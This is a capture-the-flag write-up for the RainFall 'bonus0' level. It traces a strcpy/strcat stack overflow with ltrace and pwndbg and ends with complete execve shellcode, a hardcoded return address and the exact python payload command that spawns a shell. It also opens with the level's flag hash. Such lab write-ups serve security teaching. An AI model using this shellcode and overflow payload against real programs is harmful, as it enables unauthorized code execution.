bonus0:f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728

# Reconnaissance 

```
bonus0@RainFall:~$ ltrace ./bonus0 AAAA BBBB
__libc_start_main(0x80485a4, 1, 0xbffff7e4, 0x80485d0, 0x8048640 <unfinished ...>
puts(" - " - 
)                                                                                                = 4
read(0, AAAA
"AAAA\n", 4096)                                                                                    = 5
strchr("AAAA\n", '\n')                                                                                     = "\n"
strncpy(0xbffff6c8, "AAAA", 20)                                                                            = 0xbffff6c8
puts(" - " - 
)                                                                                                = 4
read(0, BBBB
"BBBB\n", 4096)                                                                                    = 5
strchr("BBBB\n", '\n')                                                                                     = "\n"
strncpy(0xbffff6dc, "BBBB", 20)                                                                            = 0xbffff6dc
strcpy(0xbffff716, "AAAA")                                                                                 = 0xbffff716
strcat("AAAA ", "BBBB")                                                                                    = "AAAA BBBB"
puts("AAAA BBBB"AAAA BBBB
)                                                                                          = 10
+++ exited (status 0) +++
```

ask for 2 input => read 4096 bytes
copy 20 first bytes to `0xbffff6c8` for the first input and to `0xbffff6dc` for the second
address main buffer = `0xbffff736`

found 2 functions => `p` and `pp`

# Test

first input => 20 * "A"
second input => 19 * "B" + "\n"

```
pwndbg> x/12w 0xff963e88
0xff963e88:     0x41414141      0x41414141      0x41414141      0x41414141
0xff963e98:     0x41414141      0x00000001      0x08048034      0x00000000
0xff963ea8:     0xf7f66000      0x00000000      0x00000000      0xf7f22000
```
after both inputs
```
pwndbg> x/12w 0xff963e88
0xff963e88:     0x41414141      0x41414141      0x41414141      0x41414141
0xff963e98:     0x41414141      0x42424242      0x42424242      0x42424242
0xff963ea8:     0x42424242      0x00424242      0x00000000      0xf7f22000
```

copy in main buffer
```
pwndbg> x/12x 0xff963ed6
0xff963ed6:     0x41414141      0x41414141      0x41414141      0x41414141
0xff963ee6:     0x41414141      0x42424242      0x42424242      0x42424242
0xff963ef6:     0x42424242      0x00424242      0x20000000      0x2000f7f2
```

space added to main buffer
```
pwndbg> x/12w 0xff963ed6
0xff963ed6:     0x41414141      0x41414141      0x41414141      0x41414141
0xff963ee6:     0x41414141      0x42424242      0x42424242      0x42424242
0xff963ef6:     0x42424242      0x20424242      0x20000000      0x2000f7f2
```

cat b at the end of main buffer, main buffer 59 bytes long, supposed to be 42 bytes long
```
pwndbg> x/16x 0xff963ed6
0xff963ed6:     0x41414141      0x41414141      0x41414141      0x41414141
0xff963ee6:     0x41414141      0x42424242      0x42424242      0x42424242
0xff963ef6:     0x42424242      0x20424242      0x42424242      0x42424242
0xff963f06:     0x42424242      0x42424242      0x00424242      0x3fb40000
```

We find out that we can overwrite the return pointer of main: 5 last bytes are at the return pointer

# Exploit

payload => 
    first input: 20 first bytes of shellcode + padding to fill up the buffer + newline
`\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89`
    second input: 19 bytes (remaining bytes for shellcode + padding (8 bytes) + address main buffer + 1)
`\xc2\x6a\x0b\x58\xcd\x80` + 8 * "C" + 4 bytes address + random char

main buffer address => `0xbffff736` got with ltrace

shellcode => `\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89\xc2\x6a\x0b\x58\xcd\x80`

payload template => `python -c 'print "A" * 4091 + "XXXX\x0a" + 14 * "C" + "BBBBD"' > payload`

payload => `python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x53\x89\xe1\x89" + "A" * 4075 + "\x0a" + "\xc2\x6a\x0b\x58\xcd\x80" + 8 * "C" + "\x36\xf7\xff\xbf" + "D"' > /tmp/payload`

`cat /tmp/payload - | ./bonus0`
